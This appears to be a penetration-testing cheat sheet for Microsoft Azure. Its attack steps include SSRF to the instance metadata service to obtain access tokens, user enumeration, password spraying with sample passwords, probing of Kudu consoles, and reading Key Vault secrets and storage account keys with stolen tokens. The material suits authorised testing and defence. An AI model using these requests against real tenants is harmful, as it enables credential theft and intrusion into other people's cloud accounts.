# Azure Security Testing

## Overview
Security testing for Microsoft Azure cloud environments including metadata SSRF, storage account exposure, and Azure AD vulnerabilities.

## SSRF to Azure Metadata Service
```
# Azure IMDS (Instance Metadata Service)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Required header: Metadata: true

# Get access tokens for Azure services
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Required header: Metadata: true

# Full metadata endpoint tree:
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Note: Metadata: true header required
# For SSRF, you need to inject this header
# Check if SSRF allows custom headers
```

## Azure Blob Storage
```
# Public container check
https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# List all blobs
https://ACCOUNT.blob.core.windows.net/CONTAINER/?restype=container&comp=list

# Direct access to blob
https://ACCOUNT.blob.core.windows.net/CONTAINER/file.txt

# Account name guessing
# company, companydev, companyprod, companystorage
# company-backup, company-assets, company-static, company-data

# Tools
az storage blob list --container-name CONTAINER --account-name ACCOUNT --no-sign-request
```

## Azure AD / Entra ID
```
# Tenant ID discovery
https://login.microsoftonline.com/COMPANY.onmicrosoft.com/.well-known/openid-configuration
# "issuer" contains tenant ID

# User enumeration
# GetCredentialType endpoint:
POST https://login.microsoftonline.com/common/GetCredentialType
{"username":"user@company.com"}
# IfExistsResult: 1 = exists, 0 = doesn't exist

# Password spraying
# Use tools like MSOLSpray, TeamFiltration
# Common passwords: Company2023!, Company@123, Password1

# Check for legacy auth (Basic Auth over legacy protocols)
# SMTP, POP3, IMAP, EWS — often no MFA
```

## Azure Function Apps
```
# Function App URL format:
https://FUNCTION_APP.azurewebsites.net/api/FUNCTION_NAME

# Authorization levels:
# Anonymous — no key required
# Function — function key required
# Admin — host key required

# Test without key:
GET https://FUNCTION_APP.azurewebsites.net/api/HTTPTrigger1

# SCM (Kudu) console (often at .scm.azurewebsites.net):
https://FUNCTION_APP.scm.azurewebsites.net/
# May have debug console, deployment options
```

## App Service Misconfigurations
```
# SCM endpoint (Kudu)
https://APPNAME.scm.azurewebsites.net/
https://APPNAME.scm.azurewebsites.net/DebugConsole  → shell access if no auth
https://APPNAME.scm.azurewebsites.net/api/vfs/  → file system

# Environment variables
https://APPNAME.scm.azurewebsites.net/api/settings

# FTP credentials (if enabled)
# Check deployment credentials in Kudu
```

## Azure Key Vault
```
# If managed identity token obtained (via SSRF):
# Access Key Vault secrets

# Get token for Key Vault:
GET http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net
Header: Metadata: true

# List secrets:
GET https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3
Authorization: Bearer TOKEN

# Get secret value:
GET https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.3
```

## Azure Service Bus / Event Hub
```
# Check for exposed connection strings
# Format: Endpoint=sb://NAMESPACE.servicebus.windows.net/;SharedAccessKeyName=...
# In: environment variables, app configs, source code, JS bundles
```

## ARM API Access
```
# Azure Resource Manager API
# Get management token via IMDS SSRF:
resource=https://management.azure.com/

# List subscriptions
GET https://management.azure.com/subscriptions?api-version=2020-01-01
Authorization: Bearer TOKEN

# List resources in subscription
GET https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resources?api-version=2021-04-01

# Get storage account keys
POST https://management.azure.com/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Storage/storageAccounts/ACCOUNT/listKeys?api-version=2019-06-01
```

## Azure DevOps
```
# Publicly accessible projects:
https://dev.azure.com/ORGANIZATION/

# Check for exposed repos, pipelines, artifacts
# Search for secrets in repos
# Pipeline YAML may contain credentials

# PAT (Personal Access Token) format: base64 encoded
# Check for leaked PATs in code
```

## Testing Methodology
1. Test SSRF → IMDS (169.254.169.254 with Metadata: true)
2. Discover and test Azure Blob Storage containers
3. Test Azure AD user enumeration
4. Check App Service SCM (Kudu) endpoints
5. Test Function App endpoints for anonymous access
6. Look for exposed Azure credentials in JS/git
7. Test Azure DevOps for public repos and leaked secrets
8. If token obtained via IMDS: escalate with ARM API

## Tools
- `az cli` — primary Azure tool
- `ROADtools` — Azure AD enumeration
- `MSOLSpray` / `TeamFiltration` — Azure AD attacks
- `AADInternals` — Azure AD offensive tools
- `Prowler` — Azure security audit
- `ScoutSuite` — multi-cloud audit
